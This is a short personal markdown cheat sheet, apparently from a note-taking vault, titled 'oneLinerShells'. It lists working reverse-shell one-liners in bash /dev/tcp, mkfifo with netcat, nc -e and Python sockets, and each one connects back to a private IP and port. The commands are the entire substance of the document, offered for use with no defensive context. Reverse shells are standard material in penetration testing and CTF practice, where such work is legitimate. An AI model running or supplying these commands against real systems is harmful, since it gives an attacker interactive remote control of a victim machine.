---
title: "oneLinerShells"
tags:
  - fetus
---
## bash:
```sh
/usr/bin/bash -i >& /dev/tcp/192.168.90.194/4444 0>&1
bash -c /bin/bash -i >& /dev/tcp/10.10.200.85/9001 0>&1
```
## rm:
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.110.172 1337 >/tmp/f
```
## nc:
```sh
nc -e /bin/bash 10.10.200.85 1337
```
## python:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.154.145",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
#### individual files cuz why not
- [[oneLinerRmShell]] 
- [[oneLinerBashShell]] 